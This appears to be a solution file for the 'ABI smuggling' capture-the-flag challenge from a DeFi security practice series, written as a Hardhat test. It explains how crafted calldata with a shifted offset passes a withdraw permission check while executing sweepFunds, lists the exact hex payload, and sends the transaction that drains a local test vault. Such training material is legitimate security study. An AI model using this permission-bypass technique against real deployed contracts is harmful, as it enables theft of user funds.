const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] ABI smuggling', function () {
    let deployer, player, recovery;
    let token, vault;
    
    const VAULT_TOKEN_BALANCE = 1000000n * 10n ** 18n;

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [ deployer, player, recovery ] = await ethers.getSigners();

        // Deploy Damn Valuable Token contract
        token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();

        // Deploy Vault
        vault = await (await ethers.getContractFactory('SelfAuthorizedVault', deployer)).deploy();
        expect(await vault.getLastWithdrawalTimestamp()).to.not.eq(0);

        // Set permissions
        const deployerPermission = await vault.getActionId('0x85fb709d', deployer.address, vault.address);
        const playerPermission = await vault.getActionId('0xd9caed12', player.address, vault.address);
        await vault.setPermissions([deployerPermission, playerPermission]);
        expect(await vault.permissions(deployerPermission)).to.be.true;
        expect(await vault.permissions(playerPermission)).to.be.true;

        // Make sure Vault is initialized
        expect(await vault.initialized()).to.be.true;

        // Deposit tokens into the vault
        await token.transfer(vault.address, VAULT_TOKEN_BALANCE);

        expect(await token.balanceOf(vault.address)).to.eq(VAULT_TOKEN_BALANCE);
        expect(await token.balanceOf(player.address)).to.eq(0);

        // Cannot call Vault directly
        await expect(
            vault.sweepFunds(deployer.address, token.address)
        ).to.be.revertedWithCustomError(vault, 'CallerNotAllowed');
        await expect(
            vault.connect(player).withdraw(token.address, player.address, 10n ** 18n)
        ).to.be.revertedWithCustomError(vault, 'CallerNotAllowed');
    });

    it('Execution', async function () {

        // Deployer can sweep funds, but player can only withdraw
        // Reminder: bytes is a dynamic type and as such it is encoded as specified here https://docs.soliditylang.org/en/latest/abi-spec.html#use-of-dynamic-types
        // Summary: dynamic types like arrays and bytes, on their position in the calldata store the offset in memory to the first element they contain, a pointer.
        // Plan: build a low level call transaction, setting the selector and target as usual, but changing the actionData offset from 40 to a4 and the size from a8 to 44.
        //   this way the function selector in execute will match the one of withdraw(), for which the player already has permissions.
        //   But when the payload is passed to functionCall, it will execute sweepFunds()!
        // Problem: the EVM fails to execute the call if the offset is different from 0x20 or 0x40
        /*
        // Calldata contained in the first 4 + 32*3 bytes
        // This is all built by the caller and just verified by the callee. This means that as long as the rules for the argument types 
        //  are respected, we can modify it as we please!
        0x1cff79cd
        000000000000000000000000e7f1725e7734ce288f8367e1bb143e90bb3f0512
        0000000000000000000000000000000000000000000000000000000000000040 // Start offset payload, counted from the start of the payload except the signature, points to line below
        00000000000000000000000000000000000000000000000000000000000000a8 // Number of bytes in bytes type, first bytes32 of bytes type

        // Payload after the first 4 + 32*3 bytes
        0xd9caed12 // withdraw call
        0000000000000000000000005fbdb2315678afecb367f032d93f642f64180aa3
        00000000000000000000000070997970c51812dc3a010c7d01b50e0d17dc79c8
        0000000000000000000000000000000000000000000000000de0b6b3a7640000
        0x85fb709d  // sweepFunds call
        00000000000000000000000070997970c51812dc3a010c7d01b50e0d17dc79c8
        0000000000000000000000005fbdb2315678afecb367f032d93f642f64180aa3

        // Final payload: replicate this in the exploit contract
        0x1cff79cd
        000000000000000000000000e7f1725e7734ce288f8367e1bb143e90bb3f0512
        0000000000000000000000000000000000000000000000000000000000000080
        0000000000000000000000000000000000000000000000000000000000000000 // Line of 0s needed to account for selector in execute()
        d9caed1200000000000000000000000000000000000000000000000000000000 // padded withdraw selector, removed arguments
        0000000000000000000000000000000000000000000000000000000000000044
        85fb709d
        00000000000000000000000070997970c51812dc3a010c7d01b50e0d17dc79c8
        0000000000000000000000005fbdb2315678afecb367f032d93f642f64180aa3
        */

        Exploit = await (await ethers.getContractFactory('ExploitABISmuggling', player)).deploy(vault.address, token.address);
        payload = await Exploit.buildPayload(recovery.address);

        tx = {"data": payload, "from": player.address, "to": vault.address, "gasLimit": 1e7}
        console.log(tx);
        txResult = await player.sendTransaction(tx);
    });

    after(async function () {
        /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
        expect(await token.balanceOf(vault.address)).to.eq(0);
        expect(await token.balanceOf(player.address)).to.eq(0);
        expect(await token.balanceOf(recovery.address)).to.eq(VAULT_TOKEN_BALANCE);
    });
});
